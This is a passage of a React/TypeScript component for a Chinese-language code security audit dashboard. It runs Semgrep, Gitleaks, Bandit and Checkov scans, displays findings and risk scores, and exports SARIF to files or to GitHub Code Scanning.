    const line = typeof record.line === 'number' || typeof record.line === 'string' ? `:${record.line}` : ''
    const text = [record.symbol, record.function, record.evidence, record.detail, record.message]
      .find((value) => typeof value === 'string')
    return [file ? `${file}${line}` : '', text].filter(Boolean).join(' ')
  }
  return String(evidence)
}

function buildUnifiedEvidenceRows(items: ReachabilityAnalysisItem[]): ReachabilityMatrixRow[] {
  const rows = items.map((item) => {
    return {
      id: item.id,
      signal: item.name,
      severity: item.severity,
      cells: [
        matrixCell(true, '命中', '-', item.sourceFiles.join(' / ')),
        matrixCell(item.evidence.codeRefs > 0, String(item.evidence.codeRefs || 0), '-', '代码引用'),
        matrixCell(item.evidence.entryHits > 0, String(item.evidence.entryHits || 0), '-', '入口路径'),
        matrixCell(item.evidence.runtimeEvidence > 0, String(item.evidence.runtimeEvidence || 0), '-', '执行证据'),
        item.evidence.externalAlerts > 0 ? matrixCell(true, String(item.evidence.externalAlerts), '-', '外部告警') : { label: '-', status: 'na' as const, detail: '外部证据' },
        matrixCell(item.evidence.attackChainLinks > 0, item.evidence.attackChainLinks > 0 ? String(item.evidence.attackChainLinks) : '-', '-', '攻击链关联'),
      ],
    }
  })
  if (rows.length) return rows
  return []
}

export function CodeAuditPanel({
  workspace,
  workspaceId,
  importId,
  onScanned,
  onSupplementProjectArchive,
}: {
  workspace: SecurityWorkspace
  workspaceId?: string
  importId?: string
  onScanned: (audit: CodeAuditResult) => void
  onSupplementProjectArchive: (file: File) => Promise<void>
}) {
  const audit = workspace.code_audit
  const [scanning, setScanning] = useState(false)
  const [supplementing, setSupplementing] = useState(false)
  const [mutating, setMutating] = useState(false)
  const [selectedFindingId, setSelectedFindingId] = useState<string | null>(null)
  const [severityFilter, setSeverityFilter] = useState('all')
  const [categoryFilter, setCategoryFilter] = useState('all')
  const [githubOpen, setGithubOpen] = useState(false)
  const [githubOwner, setGithubOwner] = useState('HEIBAI198')
  const [githubRepo, setGithubRepo] = useState('Sysml')
  const [githubRef, setGithubRef] = useState('refs/heads/main')
  const [githubCommit, setGithubCommit] = useState('')
  const [githubToken, setGithubToken] = useState('')
  const [githubUploading, setGithubUploading] = useState(false)
  const [githubResult, setGithubResult] =
    useState<GitHubCodeScanningUploadResult | null>(null)
  const supplementInputRef = useRef<HTMLInputElement>(null)

  async function startScan() {
    setScanning(true)
    try {
      const targetPath = importId ? undefined : audit?.target_path
      const nextAudit = await runCodeAuditScan({
        workspaceId,
        importId,
        targetPath,
        includeCheckov: true,
        timeoutSeconds: 180,
      })
      setSeverityFilter('all')
      setCategoryFilter('all')
      setSelectedFindingId(nextAudit.findings[0] ? codeFindingKey(nextAudit.findings[0]) : null)
      onScanned(nextAudit)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '代码审查失败')
    } finally {
      setScanning(false)
    }
  }

  async function downloadSarif() {
    try {
      const sarif = audit?.sarif ?? (await loadCodeAuditSarif())
      downloadJson(sarif, 'supplyguard-code-audit.sarif')
      toast.success('SARIF 已导出')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'SARIF 导出失败')
    }
  }

  async function uploadGithubCodeScanning() {
    if (!audit) return
    setGithubUploading(true)
    try {
      const result = await uploadCodeAuditToGitHubCodeScanning({
        owner: githubOwner.trim(),
        repo: githubRepo.trim(),
        ref: githubRef.trim(),
        ...(githubCommit.trim() ? { commit_sha: githubCommit.trim() } : {}),
        ...(githubToken.trim() ? { token: githubToken.trim() } : {}),
      })
      setGithubResult(result)
      toast.success('GitHub Code Scanning 已提交 SARIF')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'GitHub Code Scanning 连接失败')
    } finally {
      setGithubUploading(false)
    }
  }

  async function refreshGithubUploadStatus() {
    if (!githubResult?.sarif_id) return
    setGithubUploading(true)
    try {
      const result = await loadGitHubCodeScanningUploadStatus({
        owner: githubOwner.trim(),
        repo: githubRepo.trim(),
        sarif_id: githubResult.sarif_id,
        ...(githubToken.trim() ? { token: githubToken.trim() } : {}),
      })
      setGithubResult({
        ...githubResult,
        status: result.status || githubResult.status,
        url: result.analyses_url || githubResult.url,
      })
      toast.success('GitHub Code Scanning 状态已刷新')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'GitHub Code Scanning 状态查询失败')
    } finally {
      setGithubUploading(false)
    }
  }

  async function establishBaseline() {
    if (!audit) return
    setMutating(true)
    try {
      const payload = await createCodeAuditBaseline('accepted-current-risk')
      if (payload.code_audit) onScanned(payload.code_audit)
      toast.success('基线已建立')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '建立基线失败')
    } finally {
      setMutating(false)
    }
  }

  async function ignoreFinding(fingerprint: string) {
    setMutating(true)
    try {
      const payload = await ignoreCodeAuditFinding(fingerprint, 'false-positive')
      if (payload.code_audit) onScanned(payload.code_audit)
      toast.success('已加入误报忽略')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '忽略失败')
    } finally {
      setMutating(false)
    }
  }

  async function handleSupplementFileChange(event: ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0]
    event.target.value = ''
    if (!file) return
    if (!isSupplementProjectArchive(file.name)) {
      toast.error('请选择 .zip、.tar.gz 或 .tgz 项目压缩包')
      return
    }
    setSupplementing(true)
    try {
      await onSupplementProjectArchive(file)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '补充文件处理失败')
    } finally {
      setSupplementing(false)
    }
  }

  const findings = useMemo(() => audit?.findings ?? [], [audit])
  const scanners = useMemo(() => audit?.scanners ?? [], [audit])
  const categories = useMemo(
    () => Array.from(new Set(findings.map((finding) => finding.category).filter(Boolean))).sort(),
    [findings]
  )
  const filteredFindings = useMemo(() => findings.filter((finding) => {
    if (severityFilter !== 'all' && finding.severity !== severityFilter) return false
    if (categoryFilter !== 'all' && finding.category !== categoryFilter) return false
    return true
  }), [categoryFilter, findings, severityFilter])
  const selectedFinding = filteredFindings.find((finding) => codeFindingKey(finding) === selectedFindingId)
    ?? filteredFindings[0]
  const severitySummary = codeAuditSeveritySummary(audit, findings)
  const riskScore = codeAuditRiskScore(findings, severitySummary)
  const riskFiles = Array.from(new Set(findings.map((finding) => finding.risk_file).filter(Boolean)))
  const activeScanners = scanners.filter((scanner) => scanner.available)
  const hasCompletedAudit = Boolean(audit?.scan_id)
  const scannerLabel = activeScanners.length
    ? activeScanners.slice(0, 3).map((scanner) => scanner.name).join(' / ')
    : '代码安全扫描'
  const projectLabel = workspace.import?.projectName || workspace.workspace.name || '当前项目'
  const branchLabel = workspace.workspace.branch || '未识别分支'
  const scanGeneratedAt = formatLocalDateTime(audit?.generated_at, { fallback: '' })

  return (
    <div className='space-y-4'>
      <section className='rounded-md border border-border bg-[color:var(--surface-card)] px-5 py-4'>
        <div className='flex flex-wrap items-start justify-between gap-4'>
          <div className='min-w-0'>
            <div className='flex items-center gap-3'>
              <span className='grid size-9 place-items-center rounded-md border border-cyan-300/25 bg-cyan-400/10 text-cyan-600 dark:text-cyan-100'>
                <Code2 className='size-5' />
              </span>
              <h2 className='text-page-title text-page-title-on-dark'>代码审查研判</h2>
            </div>
            <div className='mt-3 flex flex-wrap items-center gap-2'>
              <span className='text-sm font-medium text-foreground'>{projectLabel}</span>
              <span className='text-muted-foreground'>/</span>
              <span className='text-sm text-muted-foreground'>{branchLabel}</span>
              <span className={cn(
                'inline-flex items-center gap-1.5 rounded-full border px-2 py-0.5 text-xs font-medium',
                hasCompletedAudit
                  ? 'border-emerald-300/45 bg-emerald-500/10 text-emerald-700 dark:text-emerald-200'
                  : 'border-amber-300/45 bg-amber-500/10 text-amber-700 dark:text-amber-200'
              )}>
                <span className={cn('size-1.5 rounded-full', hasCompletedAudit ? 'bg-emerald-500' : 'bg-amber-500')} />
                {hasCompletedAudit ? '扫描完成' : '尚未扫描'}
              </span>
              {scanGeneratedAt ? <span className='text-xs text-muted-foreground'>更新于 {scanGeneratedAt}</span> : null}
            </div>
          </div>
          <div className='flex flex-wrap gap-2'>
            <input
              ref={supplementInputRef}
              type='file'
              accept={SUPPLEMENT_PROJECT_ARCHIVE_ACCEPT}
              className='hidden'
              onChange={(event) => void handleSupplementFileChange(event)}
            />
            {hasCompletedAudit ? (
              <>
                <Button size='sm' className={actionButtonClass} onClick={() => void startScan()} disabled={scanning}>
                  {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
                  重新扫描
                </Button>
                <Button size='sm' variant='outline' onClick={() => supplementInputRef.current?.click()} disabled={supplementing}>
                  {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
                  {SUPPLEMENT_FILE_LABEL}
                </Button>
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <Button size='icon' variant='outline' className='size-8' aria-label='更多扫描操作' title='更多扫描操作'>
                      <MoreHorizontal className='size-4' />
                    </Button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent align='end' className='w-44'>
                    <DropdownMenuItem onSelect={() => downloadReport(audit?.report || '# 代码审查报告')}>
                      <FileText className='size-4' />
                      导出报告
                    </DropdownMenuItem>
                    <DropdownMenuItem onSelect={() => void downloadSarif()}>
                      <Download className='size-4' />
                      导出 SARIF
                    </DropdownMenuItem>
                    <DropdownMenuSeparator />
                    <DropdownMenuItem disabled={mutating} onSelect={() => void establishBaseline()}>
                      <ShieldCheck className='size-4' />
                      建立当前基线
                    </DropdownMenuItem>
                    <DropdownMenuItem onSelect={() => setGithubOpen(true)}>
                      <IconGithub className='size-4' />
                      提交 Code Scanning
                    </DropdownMenuItem>
                  </DropdownMenuContent>
                </DropdownMenu>
              </>
            ) : null}
          </div>
        </div>
      </section>

      <GitHubCodeScanningDialog
        open={githubOpen}
        onOpenChange={setGithubOpen}
        owner={githubOwner}
        setOwner={setGithubOwner}
        repo={githubRepo}
        setRepo={setGithubRepo}
        refName={githubRef}
        setRefName={setGithubRef}
        commit={githubCommit}
        setCommit={setGithubCommit}
        token={githubToken}
        setToken={setGithubToken}
        uploading={githubUploading}
        result={githubResult}
        onUpload={() => void uploadGithubCodeScanning()}
        onRefresh={() => void refreshGithubUploadStatus()}
      />

      {!hasCompletedAudit ? (
        <CodeAuditEmptyState
          workspace={workspace}
          scanning={scanning}
          supplementing={supplementing}
          onScan={() => void startScan()}
          onSupplement={() => supplementInputRef.current?.click()}
        />
      ) : (
        <>
          <CodeAuditScanSummary
            summary={severitySummary}
            riskScore={riskScore}
            riskFiles={riskFiles.length}
            scannerLabel={scannerLabel}
            durationSeconds={audit?.summary.duration_seconds}
          />

          {findings.length ? (
            <div className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_380px]'>
              <CodeAuditFindingNameList
                findings={filteredFindings}
                totalCount={findings.length}
                selectedFinding={selectedFinding}
                categories={categories}
                severityFilter={severityFilter}
                categoryFilter={categoryFilter}
                onSeverityFilter={setSeverityFilter}
                onCategoryFilter={setCategoryFilter}
                onReset={() => {
                  setSeverityFilter('all')
                  setCategoryFilter('all')
                  setSelectedFindingId(findings[0] ? codeFindingKey(findings[0]) : null)
                }}
                onSelect={(finding) => setSelectedFindingId(codeFindingKey(finding))}
              />
              <CodeAuditFindingDetailPanel
                finding={selectedFinding}
                totalCount={filteredFindings.length}
                disabled={mutating}
                onIgnore={(finding) => void ignoreFinding(finding.fingerprint)}
              />
            </div>
          ) : (
            <CodeAuditNoFindingsState
              scannerLabel={scannerLabel}
              scanGeneratedAt={scanGeneratedAt}
              onScan={() => void startScan()}
              scanning={scanning}
            />
          )}

        </>
      )}
    </div>
  )
}

type CodeAuditSeveritySummary = {
  total: number
  critical: number
  high: number
  medium: number
  low: number
}

function codeAuditSeveritySummary(
  audit: CodeAuditResult | null | undefined,
  findings: CodeAuditFinding[]
): CodeAuditSeveritySummary {
  const count = (severity: SecuritySeverity) => findings.filter((finding) => finding.severity === severity).length
  return {
    total: audit?.summary.total ?? findings.length,
    critical: audit?.summary.critical ?? count('critical'),
    high: audit?.summary.high ?? count('high'),
    medium: audit?.summary.medium ?? count('medium'),
    low: audit?.summary.low ?? count('low'),
  }
}

function codeAuditRiskScore(findings: CodeAuditFinding[], summary: CodeAuditSeveritySummary) {
  const findingScore = findings.reduce((highest, finding) => Math.max(highest, Number(finding.score) || 0), 0)
  if (findingScore > 0) return Math.min(100, Math.round(findingScore))
  if (summary.critical > 0) return 95
  if (summary.high > 0) return 82
  if (summary.medium > 0) return 64
  if (summary.low > 0) return 35
  return 0
}

function codeAuditRiskLevel(
  findings: CodeAuditFinding[],
  summary: CodeAuditSeveritySummary
): SecuritySeverity {
  if (summary.critical > 0 || findings.some((finding) => finding.severity === 'critical')) return 'critical'
  if (summary.high > 0 || findings.some((finding) => finding.severity === 'high')) return 'high'
  if (summary.medium > 0 || findings.some((finding) => finding.severity === 'medium')) return 'medium'
  return 'low'
}

function codeFindingKey(finding: CodeAuditFinding) {
  return finding.fingerprint || `${finding.id}-${finding.risk_file}-${finding.line}`
}

function CodeAuditEmptyState({
  workspace,
  scanning,
  supplementing,
  onScan,
  onSupplement,
}: {
  workspace: SecurityWorkspace
  scanning: boolean
  supplementing: boolean
  onScan: () => void
  onSupplement: () => void
}) {
  const fileStats = workspace.import?.summary?.fileStats
  const languages = workspace.import?.summary?.languages ?? []
  const languageLabel = languages.slice(0, 3).map((language) => language.name).join('、') || '自动识别'
  const targetLabel = workspace.import?.sourcePath || workspace.workspace.repository || '当前导入项目'

  return (
    <section className='overflow-hidden rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='grid xl:grid-cols-[minmax(0,1fr)_340px]'>
        <div className='flex min-h-[430px] items-center px-6 py-10 sm:px-10 xl:px-14'>
          <div className='max-w-2xl'>
            <span className='grid size-12 place-items-center rounded-md border border-cyan-300/30 bg-cyan-400/10 text-cyan-600 dark:text-cyan-200'>
              <FileSearch className='size-6' />
            </span>
            <p className='mt-6 text-xs font-semibold tracking-[0.08em] text-cyan-700 uppercase dark:text-cyan-300'>准备就绪</p>
            <h3 className='mt-2 text-2xl font-semibold tracking-[0] text-foreground'>尚未执行代码安全扫描</h3>
            <p className='mt-3 max-w-xl text-sm leading-6 text-muted-foreground'>
              扫描将检查应用代码、硬编码凭据、Python 安全问题以及 Docker、CI 和 IaC 配置。完成前不会生成风险评分，也不会把“未扫描”误判为“零风险”。
            </p>

            <dl className='mt-7 grid gap-x-8 gap-y-4 border-y border-border py-5 text-sm sm:grid-cols-2'>
              <div className='min-w-0'>
                <dt className='text-xs text-muted-foreground'>扫描目标</dt>
                <dd className='mt-1 truncate font-medium text-foreground' title={targetLabel}>{targetLabel}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>识别语言</dt>
                <dd className='mt-1 font-medium text-foreground'>{languageLabel}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>可扫描文件</dt>
                <dd className='mt-1 font-medium tabular-nums text-foreground'>{fileStats?.scannable ?? fileStats?.total ?? '待统计'}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>扫描范围</dt>
                <dd className='mt-1 font-medium text-foreground'>{workspace.import?.summary?.scanScope || '项目源码与配置文件'}</dd>
              </div>
            </dl>

            <div className='mt-7 flex flex-wrap items-center gap-3'>
              <Button className={actionButtonClass} onClick={onScan} disabled={scanning}>
                {scanning ? <Loader2 className='size-4 animate-spin' /> : <FileSearch className='size-4' />}
                {scanning ? '正在扫描' : '开始扫描'}
              </Button>
              <Button variant='outline' onClick={onSupplement} disabled={supplementing}>
                {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
                补充项目文件
              </Button>
            </div>
          </div>
        </div>

        <aside className='border-t border-border bg-[color:var(--surface-inset)] px-6 py-8 xl:border-t-0 xl:border-l'>
          <div className='flex items-center gap-2'>
            <ShieldCheck className='size-4 text-cyan-600 dark:text-cyan-300' />
            <h4 className='text-sm font-semibold'>本次扫描覆盖</h4>
          </div>
          <div className='mt-5 space-y-5'>
            {[
              ['应用代码', 'Semgrep 检查危险 API、注入与不安全代码模式'],
              ['凭据泄漏', 'Gitleaks 与内置规则检查密钥、令牌和密码'],
              ['Python 安全', 'Bandit 检查危险调用与不安全默认配置'],
              ['基础设施配置', 'Checkov 检查 Docker、CI 与 IaC 策略'],
            ].map(([title, description]) => (
              <div key={title} className='grid grid-cols-[20px_minmax(0,1fr)] gap-3'>
                <CheckCircle2 className='mt-0.5 size-4 text-emerald-600 dark:text-emerald-300' />
                <div>
                  <div className='text-sm font-medium text-foreground'>{title}</div>
                  <p className='mt-1 text-xs leading-5 text-muted-foreground'>{description}</p>
                </div>
              </div>
            ))}
          </div>
          <p className='mt-7 border-t border-border pt-5 text-xs leading-5 text-muted-foreground'>
            扫描完成后将显示风险位置、规则证据、修复建议和可达性分析。
          </p>
        </aside>
      </div>
    </section>
  )
}

function CodeAuditScanSummary({
  summary,
  riskScore,
  riskFiles,
  scannerLabel,
  durationSeconds,
}: {
  summary: CodeAuditSeveritySummary
  riskScore: number
  riskFiles: number
  scannerLabel: string
  durationSeconds?: number
}) {
  const metrics = [
    { label: '风险评分', value: riskScore, tone: summary.total ? 'text-red-600 dark:text-red-300' : 'text-emerald-600 dark:text-emerald-300' },
    { label: '风险总数', value: summary.total, tone: 'text-foreground' },
    { label: '严重', value: summary.critical, tone: 'text-red-600 dark:text-red-300' },
    { label: '高危', value: summary.high, tone: 'text-orange-600 dark:text-orange-300' },
    { label: '中低危', value: summary.medium + summary.low, tone: 'text-amber-600 dark:text-amber-300' },
    { label: '风险文件', value: riskFiles, tone: 'text-cyan-700 dark:text-cyan-300' },
  ]

  return (
    <section className='rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='flex flex-wrap items-center justify-between gap-3 border-b border-border px-5 py-3'>
        <div>
          <h3 className='text-sm font-semibold text-foreground'>扫描概览</h3>
          <p className='mt-0.5 text-xs text-muted-foreground'>{scannerLabel}</p>
        </div>
        {durationSeconds !== undefined ? <span className='text-xs text-muted-foreground'>耗时 {durationSeconds.toFixed(2)} 秒</span> : null}
      </div>
      <div className='grid grid-cols-2 divide-x divide-y divide-border sm:grid-cols-3 xl:grid-cols-6 xl:divide-y-0'>
        {metrics.map((metric) => (
          <div key={metric.label} className='px-5 py-4'>
            <div className='text-xs text-muted-foreground'>{metric.label}</div>
            <div className={cn('mt-1 text-2xl font-semibold tabular-nums tracking-[0]', metric.tone)}>{metric.value}</div>
          </div>
        ))}
      </div>
    </section>
  )
}

function CodeAuditNoFindingsState({
  scannerLabel,
  scanGeneratedAt,
  onScan,
  scanning,
}: {
  scannerLabel: string
  scanGeneratedAt: string
  onScan: () => void
  scanning: boolean
}) {
  return (
    <section className='flex min-h-[360px] items-center justify-center rounded-md border border-border bg-[color:var(--surface-card)] px-6 py-12 text-center'>
      <div className='max-w-lg'>
        <span className='mx-auto grid size-12 place-items-center rounded-full border border-emerald-300/45 bg-emerald-500/10 text-emerald-600 dark:text-emerald-200'>
          <CheckCircle2 className='size-6' />
        </span>
        <h3 className='mt-5 text-xl font-semibold tracking-[0] text-foreground'>扫描完成，未发现匹配风险</h3>
        <p className='mt-3 text-sm leading-6 text-muted-foreground'>
          {scannerLabel} 已完成本次检查{scanGeneratedAt ? `，结果生成于 ${scanGeneratedAt}` : ''}。该结果表示当前规则未命中，不代表代码不存在任何安全问题。
        </p>
        <Button variant='outline' className='mt-6' onClick={onScan} disabled={scanning}>
          {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
          重新扫描
        </Button>
      </div>
    </section>
  )
}

function CodeAuditRiskOverviewCard({
  summary,
  riskScore,
  riskLevel,
  scanKey,
}: {
  summary: CodeAuditSeveritySummary
  riskScore: number
  riskLevel: SecuritySeverity
  scanKey: string
}) {
  const radius = 44
  const circumference = 2 * Math.PI * radius
  const reducedMotion = useReducedMotion()
  const { value: displayScore } = useAnimatedNumber(riskScore, {
    stiffness: 90,
    damping: 18,
    delayMs: 120,
    durationMs: 1500,
    respectReducedMotion: false,
    resetKey: scanKey,
  })
  const tone = riskGaugeTone(riskLevel)
  const severityData = [
    { label: '严重', value: summary.critical, color: 'bg-red-400' },
    { label: '高危', value: summary.high, color: 'bg-orange-400' },
    { label: '中危', value: summary.medium, color: 'bg-amber-300' },
    { label: '低危', value: summary.low, color: 'bg-cyan-300' },
  ]
  const riskTotal = Math.max(1, severityData.reduce((sum, item) => sum + item.value, 0))
  const majorRisks = summary.critical + summary.high

  return (
    <Card className='group h-[560px] overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)] transition-[border-color,transform] duration-200 hover:-translate-y-0.5 hover:border-cyan-300/25'>
      <CardContent className='relative flex h-full flex-col p-4'>
        <div className={cn('absolute -right-10 -top-12 size-32 rounded-full blur-3xl', tone.glow)} />
        <div className='relative flex items-center justify-between gap-3'>
          <div className='text-label text-muted-foreground'>风险评分</div>
          {summary.total ? (
            <SeverityPill severity={riskLevel} />
          ) : (
            <span className='inline-flex h-[26px] items-center rounded-full border border-emerald-400/30 bg-emerald-500/10 px-3 text-[13px] font-bold text-emerald-600 dark:text-emerald-200'>未发现风险</span>
          )}
        </div>
        <div className='relative flex flex-1 items-center justify-center py-4'>
          <div className='relative size-44'>
            <motion.div
              className={cn('absolute inset-3 rounded-full blur-xl', summary.total ? tone.pulse : 'bg-emerald-400/20')}
              animate={reducedMotion ? undefined : { opacity: [0.12, 0.25, 0.12], scale: [0.96, 1.04, 0.96] }}
              transition={{ duration: 2.8, repeat: Infinity, ease: 'easeInOut' }}
            />
            <svg viewBox='0 0 112 112' className='relative size-full -rotate-90'>
              <circle cx='56' cy='56' r={radius} className='fill-none stroke-[color:var(--muted)]' strokeWidth='8' />
              <motion.circle
                cx='56'
                cy='56'
                r={radius}
                className={cn('fill-none', summary.total ? tone.stroke : 'stroke-emerald-400')}
                strokeWidth='8'
                strokeLinecap='round'
                strokeDasharray={circumference}
                initial={{ strokeDashoffset: circumference }}
                animate={{ strokeDashoffset: circumference * (1 - Math.max(0, Math.min(100, riskScore)) / 100) }}
                transition={{ duration: 1.2, ease: 'easeOut' }}
              />
            </svg>
            <div className='absolute inset-0 grid place-items-center'>
              <div className='text-center'>
                <div className={cn('text-metric text-5xl', summary.total ? tone.text : 'text-emerald-500')}>{displayScore}</div>
                <div className='mt-1 text-label'>风险评分</div>
              </div>
            </div>
          </div>
        </div>
        <div className='grid grid-cols-3 gap-2'>
          {[
            ['风险总数', summary.total, 'text-cyan-600 dark:text-cyan-100'],
            ['严重高危', majorRisks, 'text-red-600 dark:text-red-100'],
            ['中低危', summary.medium + summary.low, 'text-amber-600 dark:text-amber-100'],
          ].map(([label, value, color]) => (
            <div key={label} className='rounded-md border border-border bg-[color:var(--surface-inset)] px-2 py-2 text-center'>
              <div className='text-label'>{label}</div>
              <div className={cn('mt-1 text-xl font-bold tabular-nums', color)}>{value}</div>
            </div>
          ))}
        </div>
        <div className='mt-3 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-2'>
          <div className='flex h-1.5 overflow-hidden rounded-full bg-slate-800'>
            {severityData.map((item) => (
              <span
                key={item.label}
                className={cn('transition-all duration-300', item.value > 0 ? item.color : 'bg-slate-700/70')}
                style={{ width: `${Math.max(item.value > 0 ? 10 : 6, (item.value / riskTotal) * 100)}%` }}
              />
            ))}
          </div>
          <div className='mt-2 flex flex-wrap items-center justify-between gap-2 text-label'>
            {severityData.map((item) => <span key={item.label} className='tabular-nums'>{item.label} {item.value}</span>)}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function CodeAuditFindingNameList({
  findings,
  totalCount,
  selectedFinding,
  categories,
  severityFilter,
  categoryFilter,
  onSeverityFilter,
  onCategoryFilter,
  onReset,
  onSelect,
}: {
  findings: CodeAuditFinding[]
  totalCount: number
  selectedFinding?: CodeAuditFinding
  categories: string[]
  severityFilter: string
  categoryFilter: string
  onSeverityFilter: (value: string) => void
  onCategoryFilter: (value: string) => void
  onReset: () => void
  onSelect: (finding: CodeAuditFinding) => void
}) {
  const filtered = severityFilter !== 'all' || categoryFilter !== 'all'
  return (
    <Card className='flex h-[560px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)]'>
      <CardHeader className='pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0'>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>风险明细</CardTitle>
              <span className='meta-chip'>{findings.length}/{totalCount}</span>
            </div>
            <div className='mt-1 truncate text-xs text-muted-foreground'>
              {selectedFinding?.title || '代码安全扫描结果'}
            </div>
          </div>
          <div className='flex flex-wrap items-center justify-end gap-2'>
            {filtered ? (
              <button type='button' className='inline-flex h-7 items-center rounded-full border border-cyan-300/40 bg-cyan-400/10 px-2.5 text-[12px] font-bold text-cyan-600 dark:text-cyan-100' onClick={onReset}>全部</button>
            ) : null}
            <Select value={severityFilter} onValueChange={onSeverityFilter}>
              <SelectTrigger size='sm' className='h-7 min-w-[104px] rounded-md border-border bg-[color:var(--surface-inset)]'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部等级</SelectItem>
                <SelectItem value='critical'>严重</SelectItem>
                <SelectItem value='high'>高危</SelectItem>
                <SelectItem value='medium'>中危</SelectItem>
                <SelectItem value='low'>低危</SelectItem>
              </SelectContent>
            </Select>
            <Select value={categoryFilter} onValueChange={onCategoryFilter}>
              <SelectTrigger size='sm' className='h-7 min-w-[132px] max-w-[180px] rounded-md border-border bg-[color:var(--surface-inset)]'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部类型</SelectItem>
                {categories.map((category) => <SelectItem key={category} value={category}>{category}</SelectItem>)}
              </SelectContent>
            </Select>
          </div>
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1'>
        {findings.length ? (
          <div className='h-full overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
            <div className='space-y-1.5 rounded-md border border-border bg-[color:var(--surface-inset)] p-3'>
              {findings.map((finding) => {
                const selected = codeFindingKey(finding) === (selectedFinding ? codeFindingKey(selectedFinding) : '')
                return (
                  <motion.button
                    key={codeFindingKey(finding)}
                    type='button'
                    layout
                    onClick={() => onSelect(finding)}
                    className={cn(
                      'grid w-full grid-cols-[auto_minmax(0,1fr)] items-center gap-3 rounded-md border px-2.5 py-2 text-left transition-[border-color,background-color]',
                      selected ? 'border-cyan-300/35 bg-cyan-400/10' : 'border-slate-400/10 bg-[color:var(--surface-inset)] hover:border-slate-300/25'
                    )}
                  >
                    <SeverityPill severity={finding.severity} />
                    <span className='min-w-0'>
                      <span className='block truncate text-sm font-semibold' title={finding.title}>{finding.title}</span>
                      <span className='mt-0.5 block truncate font-mono text-[11px] text-muted-foreground' title={`${finding.risk_file}:${finding.line}`}>
                        {compactWorkflowPath(finding.risk_file)}:{finding.line} · {finding.scanner}
                      </span>
                    </span>
                  </motion.button>
                )
              })}
            </div>
          </div>
        ) : (
          <div className='rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-6 text-center text-sm text-muted-foreground'>
            {totalCount ? '当前筛选条件下没有风险。' : '尚未发现代码安全风险。'}
          </div>
        )}
      </CardContent>
    </Card>
  )
}

function CodeAuditFindingDetailPanel({
  finding,
  totalCount,
  disabled,
  onIgnore,
}: {
  finding?: CodeAuditFinding
  totalCount: number
  disabled: boolean
  onIgnore: (finding: CodeAuditFinding) => void
}) {
  if (!finding) {
    return (
      <Card className='flex h-[560px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)]'>
        <CardHeader className='pb-3'><CardTitle className='text-base'>风险属性</CardTitle></CardHeader>
        <CardContent className='flex-1'>
          <div className='rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-6 text-center text-sm text-muted-foreground'>
            {totalCount ? '选择风险查看规则、证据和修复建议。' : '当前没有可查看的风险。'}
          </div>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className='flex h-[560px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)]'>
      <CardHeader className='pb-3'>
        <CardTitle className='min-w-0 truncate text-base' title={finding.title}>{finding.title}</CardTitle>
      </CardHeader>
      <CardContent className='min-w-0 flex-1 space-y-3 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
        <div className='flex flex-wrap gap-2'>
          <SeverityPill severity={finding.severity} />
          <span className='rounded-full border border-red-400/25 bg-red-500/10 px-2 py-0.5 text-xs font-medium text-red-600 dark:text-red-200'>风险 {finding.score}</span>
          <span className='rounded-full border border-cyan-300/25 bg-cyan-400/10 px-2 py-0.5 text-xs font-medium text-cyan-600 dark:text-cyan-100'>{finding.scanner}</span>
        </div>
        <div className='grid gap-2 text-sm'>
          <DetailRow label='文件' value={compactWorkflowPath(finding.risk_file) || '-'} />
          <DetailRow label='位置' value={`第 ${finding.line}${finding.end_line && finding.end_line !== finding.line ? `-${finding.end_line}` : ''} 行`} />
          <DetailRow label='规则' value={finding.rule_id || '-'} />
          <DetailRow label='类型' value={finding.category || '-'} />
          {finding.cwe ? <DetailRow label='CWE' value={finding.cwe} /> : null}
        </div>
        <CicdInfoBlock title='风险原因' text={codeFindingReasonText(finding)} />
        <CicdInfoBlock title='关键证据' text={finding.evidence || '-'} mono />
        <CicdInfoBlock title='修复建议' text={finding.recommendation || '请根据命中规则核查代码并补充针对性修复。'} tone='action' />
        <Button variant='outline' className='w-full' disabled={disabled || !finding.fingerprint} onClick={() => onIgnore(finding)}>
          <EyeOff className='size-4' />
